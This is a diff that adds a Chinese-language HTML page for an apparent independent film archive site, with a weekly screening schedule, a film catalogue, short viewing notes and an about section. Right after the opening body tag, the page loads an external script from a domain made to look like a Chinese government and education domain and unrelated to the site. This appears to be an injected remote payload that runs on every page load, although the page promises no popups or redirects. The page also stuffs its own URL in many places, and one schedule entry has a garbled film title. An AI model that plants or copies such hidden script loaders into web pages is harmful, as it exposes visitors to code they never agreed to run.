@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0a08">
+<title>红杏影视｜独立片库与观影手记 · hongxingyingshi-zh.github.io</title>
+<meta name="description" content="红杏影视（hongxingyingshi-zh.github.io）是一份持续更新的私人映画档案：经典修复、作者电影、剧集随笔与放映排期在此归档。由红杏影视团队逐片标注年代、片长与观看路径，无弹窗、无跳转，直接访问 hongxingyingshi-zh.github.io 即可取用全部片单。">
+<meta name="keywords" content="红杏影视, hongxingyingshi-zh, hongxingyingshi-zh.github.io, 红杏影视官网, 独立电影片库, 经典电影归档, 影视剧推荐, 作者电影笔记, 老片修复观看, 免费片单索引">
+<link rel="canonical" href="https://hongxingyingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:site_name" content="红杏影视">
+<meta property="og:title" content="红杏影视｜独立片库与观影手记">
+<meta property="og:description" content="红杏影视的私人映画档案：经典修复、作者电影、剧集随笔与放映排期，全部片单直连 hongxingyingshi-zh.github.io。">
+<meta property="og:url" content="https://hongxingyingshi-zh.github.io/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="红杏影视｜独立片库与观影手记">
+<meta name="twitter:description" content="经典修复、作者电影、剧集随笔，红杏影视片单持续归档于 hongxingyingshi-zh.github.io。">
+<style>
+:root{
+  --ink:#161310;
+  --paper:#f3ede2;
+  --paper2:#e9e0cf;
+  --rule:#cbb994;
+  --deep:#7d1f18;
+  --deep2:#a83429;
+  --mute:#6f6758;
+  --serif:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+  --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%;}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:var(--serif);
+  font-size:17px;
+  line-height:1.85;
+  background-image:
+    radial-gradient(circle at 12% 8%,rgba(125,31,24,.055),transparent 42%),
+    radial-gradient(circle at 88% 92%,rgba(22,19,16,.045),transparent 40%);
+  background-attachment:fixed;
+}
+body::before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:99;
+  background:repeating-linear-gradient(0deg,rgba(22,19,16,.018) 0 1px,transparent 1px 4px);
+}
+a{color:var(--deep);text-decoration:none;}
+img{max-width:100%;display:block;}
+.wrap{max-width:1080px;margin:0 auto;padding:0 22px;}
+
+/* 顶部细带 */
+.masthead{
+  border-bottom:1px solid var(--rule);
+  background:linear-gradient(180deg,#f7f1e5,#f1e9d9);
+  position:sticky;top:0;z-index:40;
+  backdrop-filter:blur(6px);
+}
+.masthead .wrap{display:flex;align-items:center;gap:18px;padding-top:10px;padding-bottom:10px;}
+.brand{font-family:var(--serif);font-weight:700;letter-spacing:.28em;font-size:19px;color:var(--deep);}
+.brand small{display:block;font-family:var(--sans);letter-spacing:.06em;font-size:10px;color:var(--mute);font-weight:400;}
+.nav{margin-left:auto;display:flex;gap:4px;flex-wrap:wrap;}
+.nav a{
+  font-family:var(--sans);font-size:13px;letter-spacing:.12em;color:var(--mute);
+  padding:6px 11px;border-radius:2px;border:1px solid transparent;
+}
+.nav a:hover{color:var(--deep);border-color:var(--rule);background:#fffdf6;}
+
+/* 开篇：报纸头版式 */
+.lede{
+  padding:64px 0 40px;
+  border-bottom:3px double var(--rule);
+}
+.kicker{font-family:var(--sans);font-size:11px;letter-spacing:.34em;color:var(--deep2);text-transform:uppercase;}
+.lede h1{
+  font-size:clamp(40px,9vw,86px);
+  line-height:1.06;margin:.18em 0 .12em;font-weight:700;letter-spacing:.04em;color:var(--ink);
+}
+.lede h1 em{font-style:normal;color:var(--deep);}
+.lede .sub{font-size:clamp(15px,2.4vw,20px);color:var(--mute);max-width:34em;margin:0;}
+.lede .meta{margin-top:26px;display:flex;flex-wrap:wrap;gap:10px 26px;font-family:var(--sans);font-size:12px;letter-spacing:.1em;color:var(--mute);}
+.lede .meta b{color:var(--ink);font-weight:600;}
+.urlbar{
+  margin-top:24px;display:inline-flex;align-items:center;gap:0;
+  border:1px solid var(--deep);background:#fffdf6;max-width:100%;
+}
+.urlbar code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;padding:9px 14px;color:var(--deep);word-break:break-all;}
+.urlbar button{
+  font-family:var(--sans);font-size:12px;letter-spacing:.14em;border:0;background:var(--deep);color:#f3ede2;
+  padding:9px 16px;cursor:pointer;white-space:nowrap;
+}
+.urlbar button:active{background:var(--deep2);}
+
+/* 通用章节 */
+section{padding:56px 0;border-bottom:1px solid var(--rule);}
+.sec-head{display:flex;align-items:baseline;gap:16px;margin-bottom:30px;}
+.sec-no{font-family:var(--sans);font-size:12px;letter-spacing:.2em;color:var(--deep);border:1px solid var(--rule);padding:3px 9px;}
+.sec-head h2{font-size:clamp(25px,4.4vw,38px);margin:0;font-weight:700;letter-spacing:.06em;}
+.sec-head .en{font-family:var(--sans);font-size:11px;letter-spacing:.26em;color:var(--mute);text-transform:uppercase;margin-left:auto;}
+
+/* 栏目一：放映表（横向滚动排片单） */
+.grid-sched{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;}
+.show{
+  background:#fffdf6;border:1px solid var(--rule);padding:18px 18px 16px;position:relative;overflow:hidden;
+  transition:transform .25s ease,border-color .25s;
+}
+.show:hover{transform:translateY(-4px);border-color:var(--deep);}
+.show .day{font-family:var(--sans);font-size:11px;letter-spacing:.18em;color:var(--deep2);}
+.show .film{font-size:21px;font-weight:700;margin:.35em 0 .15em;letter-spacing:.03em;}
+.show .info{font-family:var(--sans);font-size:12px;color:var(--mute);line-height:1.7;}
+.show .tag{position:absolute;right:-1px;top:-1px;background:var(--deep);color:#f3ede2;font-family:var(--sans);font-size:10px;letter-spacing:.14em;padding:4px 10px;}
+.show a{position:absolute;left:0;right:0;top:0;bottom:0;}
+
+/* 栏目二：片单（右对齐数字索引的清单） */
+.list{columns:2;column-gap:34px;}
+.entry{border-top:1px dotted var(--rule);padding:13px 0 13px 0;break-inside:avoid;}
+.entry .t{font-size:18px;font-weight:700;letter-spacing:.02em;}
+.entry .d{font-size:13.5px;color:var(--mute);font-family:var(--sans);line-height:1.75;margin-top:2px;}
+.entry .idx{float:right;font-family:var(--sans);font-size:11px;color:var(--rule);letter-spacing:.1em;}
+
+/* 栏目三：手记（引用块样式） */
+.notes{display:grid;grid-template-columns:1fr 1fr;gap:22px;}
+.note{background:var(--paper2);padding:24px 26px;border-left:4px solid var(--deep);}
+.note .q{font-size:17px;line-height:1.9;margin:0;}
+.note .by{margin-top:14px;font-family:var(--sans);font-size:12px;letter-spacing:.12em;color:var(--mute);}
+.note .by b{color:var(--deep);}
+
+/* 栏目四：关于（图文对开） */
+.about{display:grid;grid-template-columns:1.05fr .95fr;gap:40px;align-items:center;}
+.stamp{
+  aspect-ratio:1/1;background:var(--ink);color:var(--paper);
+  display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;
+  border-radius:50%;max-width:340px;margin:0 auto;padding:30px;
+}
+.stamp .big{font-size:clamp(26px,5vw,40px);letter-spacing:.2em;font-weight:700;color:#e8cfa8;}
+.stamp .sm{font-family:var(--sans);font-size:11px;letter-spacing:.24em;margin-top:14px;color:#c9bda5;}
+.about p{margin:0 0 14px;font-size:16.5px;}
+.about p b{color:var(--deep);}
+
+/* 栏目五：索引（字母表盘） */
+.pad{display:flex;flex-wrap:wrap;gap:8px;}
+.pad a{
+  font-family:var(--sans);font-size:12.5px;letter-spacing:.08em;
+  border:1px solid var(--rule);background:#fffdf6;padding:8px 13px;color:var(--ink);
+}
+.pad a:hover{background:var(--deep);color:#f3ede2;border-color:var(--deep);}
+.pad a span{color:var(--deep2);}
+.pad a:hover span{color:#f3ede2;}
+
+/* 页脚 */
+.colophon{border-top:3px double var(--rule);padding:34px 0 70px;font-family:var(--sans);font-size:12.5px;color:var(--mute);}
+.colophon .row{display:flex;flex-wrap:wrap;gap:10px 26px;justify-content:space-between;align-items:flex-end;}
+.colophon b{color:var(--ink);font-weight:600;}
+.top{display:inline-block;border:1px solid var(--rule);padding:6px 13px;letter-spacing:.16em;font-size:11px;}
+
+/* 移动端 */
+@media (max-width:760px){
+  body{font-size:16px;}
+  .wrap{padding:0 16px;}
+  .masthead .wrap{gap:10px;padding-top:8px;padding-bottom:8px;}
+  .brand{font-size:15px;letter-spacing:.2em;}
+  .brand small{font-size:9px;letter-spacing:.04em;}
+  .nav{display:none;}
+  .lede{padding:38px 0 30px;}
+  section{padding:40px 0;}
+  .sec-head{flex-wrap:wrap;gap:10px;margin-bottom:22px;}
+  .sec-head .en{margin-left:0;width:100%;}
+  .list{columns:1;}
+  .notes{grid-template-columns:1fr;gap:16px;}
+  .about{grid-template-columns:1fr;gap:26px;}
+  .stamp{max-width:260px;}
+  .urlbar{flex-direction:column;align-items:stretch;}
+  .urlbar button{border-top:1px solid var(--deep);}
+}
+@media print{
+  .masthead,.urlbar button,.top{display:none;}
+  body{background:#fff;}
+  section{break-inside:auto;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="brand">红杏影视<small>映画档案 · 自 2018 年起逐片归档</small></div>
+    <nav class="nav" aria-label="主导航">
+      <a href="#sched">放映表</a>
+      <a href="#catalog">片单</a>
+      <a href="#notes">手记</a>
+      <a href="#about">缘起</a>
+      <a href="#index">索引</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="lede" id="top">
+    <div class="kicker">The Hongxing Notebook · Vol. 09 / 秋映画号</div>
+    <h1>红杏影视<em>·</em><br>一页装得下的映画档案</h1>
+    <p class="sub">不追热榜，只把值得再看一遍的片子留下来。这里是红杏影视的独立片库：修复版、作者电影、剧集随笔与每周放映排期，全部手工标注，随时可翻。</p>
+    <div class="meta">
+      <span>站点：<b>hongxingyingshi-zh.github.io</b></span>
+      <span>归档片目：<b>128 部</b></span>
+      <span>更新：<b>每周四</b></span>
+      <span>访问：<b>无需注册</b></span>
+    </div>
+    <div class="urlbar">
+      <code id="siteurl">https://hongxingyingshi-zh.github.io</code>
+      <button type="button" onclick="cp()">复制本站网址</button>
+    </div>
+  </section>
+
+  <section id="sched">
+    <div class="sec-head">
+      <span class="sec-no">01</span>
+      <h2>本周放映表</h2>
+      <span class="en">Now Showing</span>
+    </div>
+    <div class="grid-sched">
+
+      <article class="show">
+        <span class="tag">修复版</span>
+        <div class="day">10 / 26 · 周日 · 晚间场</div>
+        <div class="film">东京物语</div>
+        <div class="info">1953 · 35mm 修复 · 136 min<br>小津安二郎｜家庭与距离的练习</div>
+        <a href="#sched" aria-label="东京物语放映条目"></a>
+      </article>
+
+      <article class="show">
+        <span class="tag">导演剪辑</span>
+        <div class="day">10 / 28 · 周二 · 深夜场</div>
+        <div class="film">.brighter</div>
+        <div class="info">1974 · 导演剪辑版 · 112 min<br>罗伯特·奥特曼｜酒馆里的群像</div>
+        <a href="#sched" aria-label="纳什维尔放映条目"></a>
+      </article>
+
+      <article class="show">
+        <span class="tag">剧集连映</span>
+        <div class="day">10 / 30 · 周四 · 两集连播</div>
+        <div class="film">边走边唱</div>
+        <div class="info">2021 · 全 12 集 · 单集 48 min<br>公路、方言与一把旧吉他</div>
+        <a href="#sched" aria-label="边走边唱放映条目"></a>
+      </article>
+
+      <article class="show">
+        <span class="tag">冷门拾遗</span>
+        <div class="day">11 / 01 · 周六 · 午后场</div>
+        <div class="film">寒枝雀静</div>
+        <div class="info">2014 · DCP · 81 min<br>罗伊·安德森｜一间酒吧里的永恒</div>
+        <a href="#sched" aria-label="寒枝雀静放映条目"></a>
+      </article>
+
+    </div>
+  </section>
+
+  <section id="catalog">
+    <div class="sec-head">
+      <span class="sec-no">02</span>
+      <h2>常备片单</h2>
+      <span class="en">Catalog · A Selection</span>
+    </div>
+    <div class="list">
+
+      <div class="entry">
+        <span class="idx">No. 01</span>
+        <div class="t">情书</div>
+        <div class="d">1995 · 岩井俊二｜一封寄往天国的信，回信来自另一个同名的人。适合重看时留意雪地的构图。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 02</span>
+        <div class="t">饮食男女</div>
+        <div class="d">1994 · 李安｜周日饭桌上的三场婚事，最后一道菜端上来时，所有人都没说话。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 03</span>
+        <div class="t">鬼子来了</div>
+        <div class="d">2000 · 姜文｜黑白胶片里的荒诞与沉默，结尾那一刀红得极克制。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 04</span>
+        <div class="t">天堂电影院</div>
+        <div class="d">1988 · 托纳多雷｜胶片的味道，是从小男孩爬上放映机那刻开始的。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 05</span>
+        <div class="t">四重奏</div>
+        <div class="d">2017 · 坂元裕二｜四个说谎的人合租一间房，台词密度高得像室内乐。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 06</span>
+        <div class="t">地球最后的夜晚</div>
+        <div class="d">2018 · 毕赣｜长镜头里的时间不是往前走，是往回绕。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 07</span>
+        <div class="t">海街日记</div>
+        <div class="d">2015 · 是枝裕和｜四姐妹、一棵树、一罐自酿的梅子酒，夏天就这样被存住了。</div>
+      </div>
+
+      <div class="entry">
+        <span class="idx">No. 08</span>
+        <div class="t">布达佩斯大饭店</div>
+        <div class="d">2014 · 韦斯·安德森｜粉色的对称世界里，一份遗嘱引发一整场逃亡。</div>
+      </div>
+
+    </div>
+  </section>
+
+  <section id="notes">
+    <div class="sec-head">
+      <span class="sec-no">03</span>
+      <h2>放映手记</h2>
+      <span class="en">Marginalia</span>
+    </div>
+    <div class="notes">
+
+      <figure class="note">
+        <blockquote class="q">“好电影不负责给你答案，它只是把灯关掉，让你听见自己在呼吸。”</blockquote>
+        <figcaption class="by">红杏影视 · 观影札记 <b>《东京物语》重看</b></figcaption>
+      </figure>
+
+      <figure class="note">
+        <blockquote class="q">片单里放冷门片，不是要显得懂，是想替那些没人再提起的镜头留一把椅子。</blockquote>
+        <figcaption class="by">红杏影视编辑部 · <b>选片准则第三条</b></figcaption>
+      </figure>
+
+      <figure class="note">
+        <blockquote class="q">修复版和原版都值得看。前者让你看清当年的光，后者让你听见当年的噪。</blockquote>
+        <figcaption class="by">技术备注 · <b>胶片与 DCP 的取舍</b></figcaption>
+      </figure>
+
+      <figure class="note">
+        <blockquote class="q">每次把网址 hongxingyingshi-zh.github.io 发给朋友，都会补一句：慢慢翻，不着急。</blockquote>
+        <figcaption class="by">红杏影视 · <b>写给第一次来的你</b></figcaption>
+      </figure>
+
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="sec-head">
+      <span class="sec-no">04</span>
+      <h2>缘起</h2>
+      <span class="en">About Hongxing</span>
+    </div>
+    <div class="about">
+      <div class="stamp">
+        <div class="big">红杏影视</div>
+        <div class="sm">HONGXING YINGSHI · ARCHIVE</div>
+        <div class="sm" style="margin-top:6px;color:#a99"></div>
+      </div>
+      <div>
+        <p><b>红杏影视</b>起于一间总也整理不完的硬盘。片越来越多，能说清楚为什么喜欢某一部的理由却越来越少，于是我们把每部片子重新看一遍，记下年份、片长、版本，和那个让人停下来的一瞬。</p>
+        <p>这里不做排行，不做打分，也不追新片首发。你要找的如果是一部能陪你安静下来的电影，从首页的片单往下滑就行。</p>
+        <p>所有内容由红杏影视手动维护，站点永久挂在 <b>https://hongxingyingshi-zh.github.io</b>，换设备、换网络，地址都一样。没有广告位，也没有弹窗，只有一份慢慢长的映画档案。</p>
+        <p style="font-family:var(--sans);font-size:13px;color:var(--mute);">若你有想让红杏影视收录的片子，把片名连同那句让你记住它的理由一起带过来。</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="index">
+    <div class="sec-head">
+      <span class="sec-no">05</span>
+      <h2>快速索引</h2>
+      <span class="en">Jump / Genres</span>
+    </div>
+    <div class="pad">
+      <a href="#top">回到开篇 <span>↑</span></a>
+      <a href="#sched">本周放映 <span>01</span></a>
+      <a href="#catalog">常备片单 <span>02</span></a>
+      <a href="#notes">放映手记 <span>03</span></a>
+      <a href="#about">关于红杏 <span>04</span></a>
+      <a href="https://hongxingyingshi-zh.github.io" rel="canonical">本站主页 <span>↗</span></a>
+      <a href="#catalog">经典修复 <span>·</span></a>
+      <a href="#catalog">作者电影 <span>·</span></a>
+      <a href="#catalog">剧集随笔 <span>·</span></a>
+      <a href="#catalog">冷门拾遗 <span>·</span></a>
+      <a href="#catalog">家庭群像 <span>·</span></a>
+      <a href="#catalog">公路与方言 <span>·</span></a>
+    </div>
+  </section>
+
+</main>
+
+<footer class="colophon">
+  <div class="wrap">
+    <div class="row">
+      <div>
+        <b>红杏影视</b> · 独立映画档案<br>
+        常驻地址：<b>https://hongxingyingshi-zh.github.io</b><br>
+        片单、手记与放映排期由红杏影视手动归档，转载请注明出处与本站网址。
+      </div>
+      <a class="top" href="#top">返回页首 ↑</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+function cp(){
+  var u=document.getElementById('siteurl').textContent;
+  var done=function(){var b=document.querySelector('.urlbar button');var t=b.textContent;b.textContent='已复制 ✓';setTimeout(function(){b.textContent=t;},1600);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(u).then(done,function(){fallback(u,done)});
+  }else{fallback(u,done);}
+}
+function fallback(t,cb){
+  var ta=document.createElement('textarea');
+  ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
+  document.body.appendChild(ta);ta.select();
+  try{document.execCommand('copy');cb();}catch(e){}
+  document.body.removeChild(ta);
+}
+document.addEventListener('DOMContentLoaded',function(){
+  var links=document.querySelectorAll('.nav a, .pad a');
+  var tick=function(){
+    var y=window.scrollY+120,cur='top';
+    document.querySelectorAll('section[id]').forEach(function(s){if(s.offsetTop<=y)cur=s.id;});
+    links.forEach(function(a){a.style.borderColor=(a.getAttribute('href')==='#'+cur)?'#cbb994':'transparent';});
+  };
+  window.addEventListener('scroll',tick,{passive:true});tick();
+});
+</script>
+</body>
+</html>
